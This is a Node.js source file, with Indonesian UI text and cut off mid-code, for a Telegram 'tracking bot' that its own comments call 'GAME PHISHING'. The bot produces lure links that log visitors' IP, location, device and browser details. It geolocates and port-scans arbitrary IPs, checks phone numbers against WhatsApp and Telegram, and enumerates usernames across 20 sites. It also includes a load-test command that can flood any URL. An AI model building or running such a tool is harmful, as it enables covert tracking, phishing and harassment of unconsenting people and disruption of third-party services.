/* =========================================================
   LEO TRACKING BOT + LOAD TEST + GAME PHISHING
   CRATE BY LEO | VERSION 1.2
   ========================================================= */
const fs = require('fs');
const path = require('path');
const http = require('http');
const crypto = require('crypto');
const dns = require('dns');
const net = require('net');
const axios = require('axios');
const sqlite3 = require('sqlite3').verbose();
const TelegramBot = require('node-telegram-bot-api');
const autocannon = require('autocannon');

/* ========================= TOKEN (ENV VAR) ========================= */
const BOT_TOKEN = process.env.BOT_TOKEN;
const OWNER_ID = process.env.OWNER_ID;
const PUBLIC_URL = process.env.PUBLIC_URL || 'http://localhost:3000';

if (!BOT_TOKEN || !OWNER_ID) {
  console.error('❌ BOT_TOKEN dan OWNER_ID harus di-set di environment variables!');
  process.exit(1);
}

/* ========================= LOGS ========================= */
const LOG_DIR = path.join(__dirname, 'logs');
if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR);
const LOG_FILE = path.join(LOG_DIR, 'tracking.log');
function writeLog(userId, cmd, target, status) {
  const line = `[${new Date().toISOString().replace('T',' ').slice(0,19)}] [${userId}] [${cmd}] [${target}] ${status}\n`;
  try { fs.appendFileSync(LOG_FILE, line); } catch(e) {}
}

/* ========================= DATABASE ========================= */
const db = new sqlite3.Database(path.join(__dirname, 'tracking.db'));
db.serialize(() => {
  db.run(`CREATE TABLE IF NOT EXISTS tracking_log (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id TEXT, username TEXT, command TEXT, target TEXT,
    result TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)`);
  db.run(`CREATE TABLE IF NOT EXISTS premium_users (
    user_id TEXT PRIMARY KEY, added_by TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)`);
  db.run(`CREATE TABLE IF NOT EXISTS gps_data (
    id TEXT PRIMARY KEY, ip TEXT, useragent TEXT, location TEXT,
    device TEXT, screen TEXT, language TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)`);
  db.run(`CREATE TABLE IF NOT EXISTS live_location (
    ip TEXT PRIMARY KEY, lat TEXT, lon TEXT, city TEXT, country TEXT,
    last_update DATETIME DEFAULT CURRENT_TIMESTAMP)`);
});

const dbm = {
  logTracking: (u,n,c,t,r) => db.run(`INSERT INTO tracking_log (user_id,username,command,target,result) VALUES (?,?,?,?,?)`, [u,n,c,t,r]),
  isPremium: (u,cb) => db.get(`SELECT user_id FROM premium_users WHERE user_id=?`, [u], (e,row)=>cb(!!row)),
  addPremium: (u,a,cb) => db.run(`INSERT OR REPLACE INTO premium_users (user_id,added_by) VALUES (?,?)`, [u,a], cb),
  delPremium: (u,cb) => db.run(`DELETE FROM premium_users WHERE user_id=?`, [u], cb),
  countToday: (u,cb) => db.get(`SELECT COUNT(*) as c FROM tracking_log WHERE user_id=? AND DATE(timestamp)=DATE('now')`, [u], (e,row)=>cb(row?row.c:0)),
  saveGps: (d,cb) => db.run(`INSERT OR REPLACE INTO gps_data (id,ip,useragent,location,device,screen,language) VALUES (?,?,?,?,?,?,?)`, [d.id,d.ip,d.useragent,d.location,d.device,d.screen,d.language], cb),
  getGps: (id,cb) => db.get(`SELECT * FROM gps_data WHERE id=?`, [id], cb),
  listGps: (cb) => db.all(`SELECT * FROM gps_data ORDER BY timestamp DESC`, cb),
  delGps: (id,cb) => db.run(`DELETE FROM gps_data WHERE id=?`, [id], cb),
  saveLive: (ip,lat,lon,city,country,cb) => db.run(`INSERT OR REPLACE INTO live_location (ip,lat,lon,city,country,last_update) VALUES (?,?,?,?,?,CURRENT_TIMESTAMP)`, [ip,lat,lon,city,country], cb),
  getLive: (ip,cb) => db.get(`SELECT * FROM live_location WHERE ip=?`, [ip], cb),
  exportAll: (cb) => db.all(`SELECT * FROM tracking_log`, (e,rows)=>cb(rows)),
  clearLogs: (cb) => db.run(`DELETE FROM tracking_log`, cb)
};

/* ========================= MODUL IP ========================= */
const COMMON_PORTS = [80,443,22,21,8080,3306,5432,3389,5900,4444,6667,25565];
function scanPorts(ip, ports) {
  return Promise.all(ports.map(p => new Promise(res => {
    const sock = new net.Socket();
    let done = false;
    sock.setTimeout(1500);
    sock.on('connect', () => { done=true; sock.destroy(); res({port:p, open:true}); });
    sock.on('timeout', () => { if(!done){sock.destroy(); res({port:p, open:false});} });
    sock.on('error', () => { if(!done) res({port:p, open:false}); });
    sock.connect(p, ip);
  })));
}
async function checkAbuse(ip) {
  try {
    const r = await axios.get(`https://api.abuseipdb.com/api/v2/check`, {
      params:{ ipAddress: ip, maxAgeInDays: 90 },
      headers:{ 'Key':'FREE_NO_KEY', 'Accept':'application/json' }, timeout:5000
    });
    return r.data.data;
  } catch { return { note:'Butuh API key abuseipdb untuk cek penuh' }; }
}
async function trackIP(ip) {
  const result = { ip, geo:null, ports:[], reverse:null, abuse:null, proxy:null, maps:null };
  try {
    const r = await axios.get(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp,org,as,timezone,proxy,hosting,query`);
    if (r.data.status === 'success') {
      result.geo = r.data;
      result.maps = `https://maps.google.com/?q=${r.data.lat},${r.data.lon}`;
      result.proxy = r.data.proxy ? 'YA' : 'TIDAK';
    }
  } catch(e){ result.geo = { error:e.message }; }
  result.reverse = await new Promise(res => dns.reverse(ip, (e,h)=>res(e?null:h)));
  result.ports = await scanPorts(ip, COMMON_PORTS);
  result.abuse = await checkAbuse(ip);
  return result;
}

/* ========================= MODUL PHONE ========================= */
const PROVIDERS = [
  { prefix:['0811','0812','0813','0821','0822','0823','0851','0852','0853'], name:'Telkomsel' },
  { prefix:['0814','0815','0816','0817','0818','0819','0855','0856','0857','0858','0859'], name:'Indosat' },
  { prefix:['0817','0818','0819','0831','0832','0833','0838'], name:'XL' },
  { prefix:['0895','0896','0897','0898','0899'], name:'Tri' },
  { prefix:['0881','0882','0883','0884','0885','0886','0887','0888','0889'], name:'Smartfren' },
  { prefix:['0831','0832','0833'], name:'Axis' }
];
function detectProvider(num) {
  const n = num.replace(/^\+62/,'0').replace(/^62/,'0');
  for (const p of PROVIDERS) if (p.prefix.some(pr=>n.startsWith(pr))) return p.name;
  return 'Unknown';
}
async function trackPhone(num) {
  const clean = num.replace(/[^0-9+]/g,'');
  const intl = clean.startsWith('+') ? clean : (clean.startsWith('0') ? '+62'+clean.slice(1) : '+'+clean);
  const result = { input:num, international:intl, provider:detectProvider(clean), whatsapp:null, telegram:null };
  try {
    const wa = `https://wa.me/${intl.replace('+','')}`;
    const r = await axios.get(wa, { timeout:8000, validateStatus:()=>true });
    result.whatsapp = { link:wa, status:r.status, exists:r.status===200 };
  } catch(e){ result.whatsapp = { error:e.message }; }
  try {
    const tg = `https://t.me/+${intl.replace('+','')}`;
    const r = await axios.get(tg, { timeout:8000, validateStatus:()=>true });
    result.telegram = { link:tg, status:r.status, exists:r.status===200 };
  } catch(e){ result.telegram = { error:e.message }; }
  return result;
}

/* ========================= MODUL DOMAIN ========================= */
const pfn = (fn) => (...args) => new Promise((res,rej)=>fn(...args,(e,d)=>e?rej(e):res(d)));
const resolveA = pfn(dns.resolve4), resolveAAAA = pfn(dns.resolve6), resolveMX = pfn(dns.resolveMx);
const resolveTXT = pfn(dns.resolveTxt), resolveNS = pfn(dns.resolveNs), resolveCNAME = pfn(dns.resolveCname);
const resolveSOA = pfn(dns.resolveSoa);
async function trackDomain(domain) {
  const result = { domain };
  try { result.a = await resolveA(domain); } catch { result.a = null; }
  try { result.aaaa = await resolveAAAA(domain); } catch { result.aaaa = null; }
  try { result.mx = await resolveMX(domain); } catch { result.mx = null; }
  try { result.txt = await resolveTXT(domain); } catch { result.txt = null; }
  try { result.ns = await resolveNS(domain); } catch { result.ns = null; }
  try { result.cname = await resolveCNAME(domain); } catch { result.cname = null; }
  try { result.soa = await resolveSOA(domain); } catch { result.soa = null; }
  try {
    const r = await axios.get(`http://${domain}`, { timeout:8000, validateStatus:()=>true });
    result.headers = r.headers;
    result.server = r.headers['server'] || '-';
    result.tech = r.headers['x-powered-by'] || '-';
  } catch(e){ result.headers = { error:e.message }; }
  try {
    const r = await axios.get(`https://api.whoisfreaks.com/v1.0/whois?whois=live&domainName=${domain}&apiKey=FREE`, { timeout:8000 });
    result.whois = r.data;
  } catch { result.whois = 'Butuh API key whois untuk data lengkap'; }
  return result;
}

/* ========================= MODUL SOSMED ========================= */
const PLATFORMS = [
  { name:'Instagram', url:u=>`https://www.instagram.com/${u}/` },
  { name:'Twitter/X', url:u=>`https://twitter.com/${u}` },
  { name:'TikTok', url:u=>`https://www.tiktok.com/@${u}` },
  { name:'Facebook', url:u=>`https://www.facebook.com/${u}` },
  { name:'YouTube', url:u=>`https://www.youtube.com/@${u}` },
  { name:'GitHub', url:u=>`https://github.com/${u}` },
  { name:'Reddit', url:u=>`https://www.reddit.com/user/${u}` },
  { name:'Pinterest', url:u=>`https://www.pinterest.com/${u}/` },
  { name:'Snapchat', url:u=>`https://www.snapchat.com/add/${u}` },
  { name:'Tumblr', url:u=>`https://${u}.tumblr.com` },
  { name:'LinkedIn', url:u=>`https://www.linkedin.com/in/${u}` },
  { name:'Twitch', url:u=>`https://www.twitch.tv/${u}` },
  { name:'Spotify', url:u=>`https://open.spotify.com/user/${u}` },
  { name:'Steam', url:u=>`https://steamcommunity.com/id/${u}` },
  { name:'Discord', url:u=>`https://discord.com/users/${u}` },
  { name:'OnlyFans', url:u=>`https://onlyfans.com/${u}` },
  { name:'Patreon', url:u=>`https://www.patreon.com/${u}` },
  { name:'Telegram', url:u=>`https://t.me/${u}` },
  { name:'WhatsApp', url:u=>`https://wa.me/${u}` },
  { name:'Signal', url:u=>`https://signal.me/#p/${u}` }
];
async function trackSosmed(username) {
  const results = [];
  for (const pl of PLATFORMS) {
    const url = pl.url(username);
    try {
      const r = await axios.get(url, { timeout:7000, validateStatus:()=>true,
        headers:{ 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' } });
      results.push({ platform:pl.name, url, status:r.status, exists:r.status===200 });
    } catch(e){
      results.push({ platform:pl.name, url, status:'ERR', exists:false });
    }
  }
  return results;
}

/* ========================= MODUL LOCATION ========================= */
async function updateLiveLocation(ip) {
  try {
    const r = await axios.get(`http://ip-api.com/json/${ip}?fields=status,country,city,lat,lon`);
    if (r.data.status === 'success') {
      dbm.saveLive(ip, r.data.lat, r.data.lon, r.data.city, r.data.country, ()=>{});
      return r.data;
    }
  } catch {}
  return null;
}

/* ========================= MODUL DEVICE ========================= */
function parseUA(ua) {
  const out = { raw:ua, os:'Unknown', browser:'Unknown', type:'Unknown', version:'-' };
  if (/android/i.test(ua)) { out.os='Android'; out.type='Mobile'; }
  else if (/iphone|ipad|ipod/i.test(ua)) { out.os='iOS'; out.type=/ipad/i.test(ua)?'Tablet':'Mobile'; }
  else if (/windows/i.test(ua)) { out.os='Windows'; out.type='Desktop'; }
  else if (/mac os/i.test(ua)) { out.os='macOS'; out.type='Desktop'; }
  else if (/linux/i.test(ua)) { out.os='Linux'; out.type='Desktop'; }
  if (/chrome\/([\d.]+)/i.test(ua)) { out.browser='Chrome'; out.version=ua.match(/chrome\/([\d.]+)/i)[1]; }
  else if (/firefox\/([\d.]+)/i.test(ua)) { out.browser='Firefox'; out.version=ua.match(/firefox\/([\d.]+)/i)[1]; }
  else if (/safari\/([\d.]+)/i.test(ua) && !/chrome/i.test(ua)) { out.browser='Safari'; out.version=ua.match(/version\/([\d.]+)/i)?.[1]||'-'; }
  else if (/edg\/([\d.]+)/i.test(ua)) { out.browser='Edge'; out.version=ua.match(/edg\/([\d.]+)/i)[1]; }
  else if (/opera|opr\/([\d.]+)/i.test(ua)) { out.browser='Opera'; }
  const model = ua.match(/\(([^)]+)\)/);
  if (model) out.deviceInfo = model[1];
  return out;
}

/* ========================= MODUL LOAD TEST ========================= */
function runLoadTest(url, duration, connections, method = 'GET', body = null) {
  return new Promise((resolve) => {
    const instance = autocannon({
      url, connections, duration, method, body,
      headers: { 'User-Agent': 'Authorized-LoadTest/1.0 (BugBounty)', 'Accept': '*/*' },
      timeout: 10, pipelining: 1
    }, (err, result) => {
      if (err) return resolve({ error: err.message });
      resolve({
        url, duration, connections, method,
        rps: result.requests.average,
        latencyAvg: result.latency.average,
        latencyP99: result.latency.p99,
        totalRequests: result.requests.total,
        errors: result.errors,
        non2xx: result.non2xx,
        throughputMBs: (result.throughput.average / 1024 / 1024).toFixed(2)
      });
    });
    autocannon.track(instance, { renderProgressBar: false });
  });
}

/* =========================================================
   BOT + UI
   ========================================================= */
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const MENU_IMG = "https://files.catbox.moe/ededou.jpg";
const HEADER = `<b>╔══════════════════════╗</b>
<b>   💀 LEO TRACKING BOT 💀</b>
<b>╚══════════════════════╝</b>
<b>CRATE BY LEO</b>
<b>NAMEBOT: LEO TRACKING</b>
<b>VERSION: 1.2</b>`;

function mainKeyboard() {
  return { inline_keyboard: [
    [ { text:"🌐 Track IP", callback_data:"menu_ip" }, { text:"📱 Track Phone", callback_data:"menu_phone" } ],
    [ { text:"🌍 Track Domain", callback_data:"menu_domain" }, { text:"🔍 Track Sosmed", callback_data:"menu_sosmed" } ],
    [ { text:"🎯 GPS Tracker", callback_data:"menu_gps" }, { text:"🖥️ Device Info", callback_data:"menu_device" } ],
    [ { text:"📍 Live Location", callback_data:"menu_live" }, { text:"📊 Status Akun", callback_data:"menu_status" } ],
    [ { text:"⚡ Load Test (Authorized)", callback_data:"menu_loadtest" }, { text:"❓ Help", callback_data:"menu_help" } ]
  ]};
}
function backKeyboard() {
  return { inline_keyboard: [[ { text:"⬅️ Kembali ke Menu", callback_data:"menu_main" } ]] };
}
function menuText(msg, premium, sisa) {
  return `${HEADER}\n\n👤 User: ${msg.from.first_name||''} ${msg.from.last_name||''}\n🆔 ID: <code>${msg.from.id}</code>\n💎 Status: ${premium?'PREMIUM':'FREE'}\n📊 Sisa Tracking Hari Ini: ${premium?'∞':sisa}\n\n📋 <b>Pilih menu di bawah</b> atau ketik command langsung.`;
}
function sendMainMenu(chatId, msg, edit=false) {
  const id = String(msg.from.id);
  dbm.isPremium(id, (prem) => {
    dbm.countToday(id, (c) => {
      const caption = menuText(msg, prem, Math.max(0, 3-c));
      if (edit && msg.message && msg.message.message_id) {
        bot.editMessageCaption(caption, {
          chat_id:chatId, message_id:msg.message.message_id,
          parse_mode:'HTML', reply_markup:mainKeyboard()
        }).catch(()=>{
          bot.sendPhoto(chatId, MENU_IMG, { caption, parse_mode:'HTML', reply_markup:mainKeyboard() });
        });
      } else {
        bot.sendPhoto(chatId, MENU_IMG, { caption, parse_mode:'HTML', reply_markup:mainKeyboard() });
      }
    });
  });
}

bot.onText(/\/start/, (msg) => sendMainMenu(msg.chat.id, msg));

/* ========================= CALLBACK ========================= */
bot.on('callback_query', async (q) => {
  const chatId = q.message.chat.id;
  const msgId = q.message.message_id;
  const data = q.data;
  bot.answerCallbackQuery(q.id).catch(()=>{});

  const editPhoto = (caption, kb) => {
    bot.editMessageCaption(caption, {
      chat_id:chatId, message_id:msgId, parse_mode:'HTML', reply_markup:kb
    }).catch(()=>{
      bot.sendPhoto(chatId, MENU_IMG, { caption, parse_mode:'HTML', reply_markup:kb });
    });
  };

  if (data === 'menu_main') return sendMainMenu(chatId, { from:q.from, message:q.message }, true);
  if (data === 'menu_ip') return editPhoto(`${HEADER}\n\n🌐 <b>TRACK IP</b>\n\nGunakan:\n<code>/trackip 8.8.8.8</code>`, backKeyboard());
  if (data === 'menu_phone') return editPhoto(`${HEADER}\n\n📱 <b>TRACK PHONE</b>\n\nGunakan:\n<code>/trackphone 08123456789</code>`, backKeyboard());
  if (data === 'menu_domain') return editPhoto(`${HEADER}\n\n🌍 <b>TRACK DOMAIN</b>\n\nGunakan:\n<code>/trackdomain example.com</code>`, backKeyboard());
  if (data === 'menu_sosmed') return editPhoto(`${HEADER}\n\n🔍 <b>TRACK SOSMED</b>\n\nGunakan:\n<code>/tracksosmed username</code>`, backKeyboard());
  if (data === 'menu_gps') return editPhoto(`${HEADER}\n\n🎯 <b>GPS TRACKER</b>\n\nGunakan:\n<code>/trackgps</code>`, backKeyboard());
  if (data === 'menu_device') return editPhoto(`${HEADER}\n\n🖥️ <b>DEVICE INFO</b>\n\nGunakan:\n<code>/deviceinfo Mozilla/5.0...</code>`, backKeyboard());
  if (data === 'menu_live') return editPhoto(`${HEADER}\n\n📍 <b>LIVE LOCATION</b>\n\nGunakan:\n<code>/livelocation 8.8.8.8</code>`, backKeyboard());
  if (data === 'menu_status') {
    const id = String(q.from.id);
    dbm.isPremium(id, (prem) => {
      dbm.countToday(id, (c) => {
        editPhoto(`${HEADER}\n\n📊 <b>STATUS AKUN</b>\n\n🆔 ID: <code>${id}</code>\n💎 Status: ${prem?'PREMIUM':'FREE'}\n📈 Tracking hari ini: ${c}${prem?'':'/3'}`, backKeyboard());
      });
    });
    return;
  }
  if (data === 'menu_loadtest') return editPhoto(`${HEADER}\n\n⚡ <b>LOAD TEST (AUTHORIZED)</b>\n\n⚠️ Hanya untuk target yang kamu punya IZIN TERTULIS.\n\nGunakan:\n<code>/loadtest https://target.com 30 50 GET</code>`, backKeyboard());
  if (data === 'menu_help') return editPhoto(`${HEADER}\n\n❓ <b>HELP</b>\n\n/trackip [IP]\n/trackphone [nomor]\n/trackdomain [domain]\n/tracksosmed [username]\n/trackgps\n/gpsdata [id]\n/deviceinfo [UA]\n/livelocation [ip]\n/loadtest <url> <durasi> <koneksi> [method] (owner)\n/status\n\nOwner: /addprem /delprem /export /clearlogs`, backKeyboard());
});

/* ========================= STATUS ========================= */
bot.onText(/\/status/, (msg) => {
  const id = String(msg.from.id);
  dbm.isPremium(id, (prem) => {
    dbm.countToday(id, (c) => {
      bot.sendPhoto(msg.chat.id, MENU_IMG, {
        caption: `${HEADER}\n\n🆔 ID: <code>${id}</code>\n💎 Status: ${prem?'PREMIUM':'FREE'}\n📊 Tracking hari ini: ${c}${prem?'':'/3'}`,
        parse_mode:'HTML', reply_markup: backKeyboard()
      });
    });
  });
});

/* ========================= LIMIT ========================= */
function checkLimit(msg, cb) {
  const id = String(msg.from.id);
  dbm.isPremium(id, (prem) => {
    if (prem) return cb(true);
    dbm.countToday(id, (c) => {
      if (c >= 3) { bot.sendMessage(msg.chat.id, '❌ Limit FREE habis (3/hari). Upgrade premium.'); return cb(false); }
      cb(true);
    });
  });
}

/* ========================= TRACK IP ========================= */
bot.onText(/\/trackip (.+)/, (msg, match) => {
  checkLimit(msg, async (ok) => {
    if (!ok) return;
    const ip = match[1].trim();
    bot.sendMessage(msg.chat.id, `⏳ Melacak IP ${ip}...`);
    try {
      const r = await trackIP(ip);
      const portList = r.ports.map(x => `${x.port}:${x.open?'🟢OPEN':'🔴closed'}`).join('\n');
      const txt = `🌐 <b>IP TRACKER</b>\nIP: <code>${ip}</code>\n` +
        `🌍 ${r.geo?.country||'-'} / ${r.geo?.regionName||'-'} / ${r.geo?.city||'-'}\n` +
        `📍 ${r.geo?.lat||'-'}, ${r.geo?.lon||'-'}\n` +
        `🏢 ISP: ${r.geo?.isp||'-'}\n🏛️ Org: ${r.geo?.org||'-'}\n` +
        `🔢 ASN: ${r.geo?.as||'-'}\n⏰ TZ: ${r.geo?.timezone||'-'}\n` +
        `🛡️ Proxy/VPN: ${r.proxy}\n🔁 Reverse: ${r.reverse?r.reverse.join(', '):'-'}\n` +
        `🗺️ ${r.maps||'-'}\n\n<b>Port Scan:</b>\n${portList}`;
      bot.sendMessage(msg.chat.id, txt, { parse_mode:'HTML', disable_web_page_preview:true });
      dbm.logTracking(String(msg.from.id), msg.from.username||'', '/trackip', ip, JSON.stringify(r).slice(0,500));
      writeLog(msg.from.id, '/trackip', ip, 'SUCCESS');
    } catch(e) {
      bot.sendMessage(msg.chat.id, '❌ Error: ' + e.message);
      writeLog(msg.from.id, '/trackip', ip, 'FAIL');
    }
  });
});

/* ========================= TRACK PHONE ========================= */
bot.onText(/\/trackphone (.+)/, (msg, match) => {
  checkLimit(msg, async (ok) => {
    if (!ok) return;
    const num = match[1].trim();
    bot.sendMessage(msg.chat.id, `⏳ Melacak nomor ${num}...`);
    try {
      const r = await trackPhone(num);
      const txt = `📱 <b>PHONE TRACKER</b>\nInput: ${r.input}\nIntl: ${r.international}\n` +
        `📡 Provider: ${r.provider}\n` +
        `💬 WhatsApp: ${r.whatsapp?.exists?'✅ Ada':'❌ Tidak'} (${r.whatsapp?.link||'-'})\n` +
        `✈️ Telegram: ${r.telegram?.exists?'✅ Ada':'❌ Tidak'} (${r.telegram?.link||'-'})`;
      bot.sendMessage(msg.chat.id, txt, { parse_mode:'HTML', disable_web_page_preview:true });
      dbm.logTracking(String(msg.from.id), msg.from.username||'', '/trackphone', num, JSON.stringify(r).slice(0,500));
      writeLog(msg.from.id, '/trackphone', num, 'SUCCESS');
    } catch(e) {
      bot.sendMessage(msg.chat.id, '❌ Error: ' + e.message);
      writeLog(msg.from.id, '/trackphone', num, 'FAIL');
    }
  });
});

/* ========================= TRACK DOMAIN ========================= */
bot.onText(/\/trackdomain (.+)/, (msg, match) => {
  checkLimit(msg, async (ok) => {
    if (!ok) return;
    const d = match[1].trim();
    bot.sendMessage(msg.chat.id, `⏳ Melacak domain ${d}...`);
    try {
      const r = await trackDomain(d);
      const txt = `🌐 <b>DOMAIN TRACKER</b>\nDomain: ${d}\n` +
        `A: ${(r.a||[]).join(', ')||'-'}\nAAAA: ${(r.aaaa||[]).join(', ')||'-'}\n` +
        `NS: ${(r.ns||[]).join(', ')||'-'}\n` +
        `MX: ${(r.mx||[]).map(m=>m.exchange).join(', ')||'-'}\n` +
        `CNAME: ${(r.cname||[]).join(', ')||'-'}\n` +
        `TXT: ${(r.txt||[]).map(t=>t.join('')).join(' | ')||'-'}\n` +
        `SOA: ${r.soa?JSON.stringify(r.soa):'-'}\n` +
        `Server: ${r.server||'-'}\nTech: ${r.tech||'-'}`;
      bot.sendMessage(msg.chat.id, txt, { parse_mode:'HTML', disable_web_page_preview:true });
      dbm.logTracking(String(msg.from.id), msg.from.username||'', '/trackdomain', d, JSON.stringify(r).slice(0,500));
      writeLog(msg.from.id, '/trackdomain', d, 'SUCCESS');
    } catch(e) {
      bot.sendMessage(msg.chat.id, '❌ Error: ' + e.message);
      writeLog(msg.from.id, '/trackdomain', d, 'FAIL');
    }
  });
});

/* ========================= TRACK SOSMED ========================= */
bot.onText(/\/tracksosmed (.+)/, (msg, match) => {
  checkLimit(msg, async (ok) => {
    if (!ok) return;
    const u = match[1].trim().replace('@','');
    bot.sendMessage(msg.chat.id, `⏳ Melacak username ${u} di 20 platform...`);
    try {
      const r = await trackSosmed(u);
      const lines = r.map(x => `${x.exists?'✅':'❌'} ${x.platform} (${x.status}) - ${x.url}`).join('\n');
      bot.sendMessage(msg.chat.id, `🔍 <b>SOSMED TRACKER</b>\nUsername: ${u}\n\n${lines}`,
        { parse_mode:'HTML', disable_web_page_preview:true });
      dbm.logTracking(String(msg.from.id), msg.from.username||'', '/tracksosmed', u, JSON.stringify(r).slice(0,500));
      writeLog(msg.from.id, '/tracksosmed', u, 'SUCCESS');
    } catch(e) {
      bot.sendMessage(msg.chat.id, '❌ Error: ' + e.message);
      writeLog(msg.from.id, '/tracksosmed', u, 'FAIL');
    }
  });
});

/* ========================= GPS PHISHING ========================= */
bot.onText(/\/trackgps/, (msg) => {
  checkLimit(msg, (ok) => {
    if (!ok) return;
    const id = crypto.randomBytes(4).toString('hex');
    const link = `${PUBLIC_URL}/gps/${id}`;
    bot.sendMessage(msg.chat.id,
      `🎯 <b>GPS TRACKING LINK</b>\nID: <code>${id}</code>\nLink: ${link}\n\n` +
      `Lihat hasil: /gpsdata ${id}`,
      { parse_mode:'HTML', disable_web_page_preview:true });
    writeLog(msg.from.id, '/trackgps', id, 'GENERATED');
  });
});

bot.onText(/\/gpsdata (.+)/, (msg, match) => {
  const id = match[1].trim();
  dbm.getGps(id, (e, row) => {
    if (!row) return bot.sendMessage(msg.chat.id, '❌ Data tidak ditemukan.');
    const txt = `📍 <b>GPS DATA</b>\nID: ${row.id}\nIP: ${row.ip}\nUA: ${row.useragent}\n` +
      `Lokasi: ${row.location}\nDevice: ${row.device}\nScreen: ${row.screen}\nLanguage: ${row.language}\nTime: ${row.timestamp}`;
    bot.sendMessage(msg.chat.id, txt, { parse_mode:'HTML' });
  });
});

bot.onText(/\/gpslist/, (msg) => {
  if (String(msg.from.id) !== String(OWNER_ID)) return bot.sendMessage(msg.chat.id, '❌ Owner only.');
  dbm.listGps((e, rows) => {
    if (!rows.length) return bot.sendMessage(msg.chat.id, 'Kosong.');
    const txt = rows.map(r => `ID: ${r.id} | IP: ${r.ip} | ${r.location} | ${r.timestamp}`).join('\n');
    bot.sendMessage(msg.chat.id, '📋 <b>GPS LIST</b>\n' + txt, { parse_mode:'HTML' });
  });
});

bot.onText(/\/gpsdelete (.+)/, (msg, match) => {
  if (String(msg.from.id) !== String(OWNER_ID)) return bot.sendMessage(msg.chat.id, '❌ Owner only.');
  dbm.delGps(match[1].trim(), () => bot.sendMessage(msg.chat.id, '✅ Dihapus.'));
});

/* ========================= DEVICE INFO ========================= */
bot.onText(/\/deviceinfo (.+)/, (msg, match) => {
  const ua = match[1].trim();
  const pp = parseUA(ua);
  bot.sendMessage(msg.chat.id,
    `🖥️ <b>DEVICE INFO</b>\nOS: ${pp.os}\nBrowser: ${pp.browser} ${pp.version}\nType: ${pp.type}\nDevice: ${pp.deviceInfo||'-'}`,
    { parse_mode:'HTML' });
  writeLog(msg.from.id, '/deviceinfo', ua.slice(0,30), 'SUCCESS');
});

/* ========================= LIVE LOCATION ========================= */
bot.onText(/\/livelocation (.+)/, async (msg, match) => {
  checkLimit(msg, async (ok) => {
    if (!ok) return;
    const ip = match[1].trim();
    const r = await updateLiveLocation(ip);
    if (!r) return bot.sendMessage(msg.chat.id, '❌ Gagal ambil lokasi.');
    bot.sendMessage(msg.chat.id,
      `📍 <b>LIVE LOCATION</b>\nIP: ${ip}\n${r.city}, ${r.country}\n${r.lat}, ${r.lon}\n` +
      `🗺️ https://maps.google.com/?q=${r.lat},${r.lon}\nUpdate: ${new Date().toLocaleString()}`,
      { parse_mode:'HTML', disable_web_page_preview:true });
    writeLog(msg.from.id, '/livelocation', ip, 'SUCCESS');
  });
});

/* ========================= LOAD TEST (AUTHORIZED) ========================= */
bot.onText(/\/loadtest (.+)/, async (msg, match) => {
  if (String(msg.from.id) !== String(OWNER_ID)) return bot.sendMessage(msg.chat.id, '❌ Owner only.');
  const parts = match[1].trim().split(/\s+/);
  const url = parts[0];
  const duration = parseInt(parts[1] || '30');
  const connections = parseInt(parts[2] || '50');
  const method = (parts[3] || 'GET').toUpperCase();

  if (!url || !/^https?:\/\//.test(url)) {
    return bot.sendMessage(msg.chat.id, '❌ Format: /loadtest <url> <durasi> <koneksi> [method]');
  }
  if (duration > 120) return bot.sendMessage(msg.chat.id, '❌ Maks durasi 120 detik.');
  if (connections > 200) return bot.sendMessage(msg.chat.id, '❌ Maks koneksi 200.');

  bot.sendMessage(msg.chat.id,
    `⚡ <b>LOAD TEST DIMULAI</b>\n\nURL: ${url}\nDurasi: ${duration}s\nKoneksi: ${connections}\nMethod: ${method}\n\n⏳ Menjalankan...`,
    { parse_mode:'HTML', disable_web_page_preview:true });

  const r = await runLoadTest(url, duration, connections, method);
  if (r.error) {
    bot.sendMessage(msg.chat.id, '❌ Error: ' + r.error);
    writeLog(msg.from.id, '/loadtest', url, 'FAIL');
    return;
  }
  const txt = `✅ <b>LOAD TEST SELESAI</b>\n\nURL: ${r.url}\nMethod: ${r.method}\nDurasi: ${r.duration}s\nKoneksi: ${r.connections}\n\n` +
    `📊 <b>Hasil:</b>\nRequests/sec: ${r.rps}\nLatency avg: ${r.latencyAvg} ms\nLatency p99: ${r.latencyP99} ms\n` +
    `Total requests: ${r.totalRequests}\nErrors: ${r.errors}\nNon-2xx: ${r.non2xx}\nThroughput: ${r.throughputMBs} MB/s`;
  bot.sendMessage(msg.chat.id, txt, { parse_mode:'HTML', disable_web_page_preview:true });
  dbm.logTracking(String(msg.from.id), msg.from.username||'', '/loadtest', url, JSON.stringify(r).slice(0,500));
  writeLog(msg.from.id, '/loadtest', url, 'SUCCESS');
});

/* ========================= PREMIUM ========================= */
bot.onText(/\/addprem (.+)/, (msg, match) => {
  if (String(msg.from.id) !== String(OWNER_ID)) return bot.sendMessage(msg.chat.id, '❌ Owner only.');
  dbm.addPremium(match[1].trim(), String(msg.from.id), () => bot.sendMessage(msg.chat.id, `✅ ${match[1].trim()} jadi PREMIUM.`));
});
bot.onText(/\/delprem (.+)/, (msg, match) => {
  if (String(msg.from.id) !== String(OWNER_ID)) return bot.sendMessage(msg.chat.id, '❌ Owner only.');
  dbm.delPremium(match[1].trim(), () => bot.sendMessage(msg.chat.id, `✅ ${match[1].trim()} dihapus dari PREMIUM.`));
});

/* ========================= EXPORT & CLEAR ========================= */
bot.onText(/\/export/, (msg) => {
  if (String(msg.from.id) !== String(OWNER_ID)) return bot.sendMessage(msg.chat.id, '❌ Owner only.');
  dbm.exportAll((rows) => {
    const file = `export_${Date.now()}.json`;
    fs.writeFileSync(file, JSON.stringify(rows, null, 2));
    bot.sendDocument(msg.chat.id, file).then(() => fs.unlinkSync(file));
  });
});
bot.onText(/\/clearlogs/, (msg) => {
  if (String(msg.from.id) !== String(OWNER_ID)) return bot.sendMessage(msg.chat.id, '❌ Owner only.');
  dbm.clearLogs(() => bot.sendMessage(msg.chat.id, '✅ Logs dibersihkan.'));
});

/* ========================= HTTP SERVER - GAME PHISHING ========================= */
const server = http.createServer((req, res) => {
  const url = req.url;
  const m = url.match(/^\/gps\/([a-f0-9]+)/);
  if (m) {
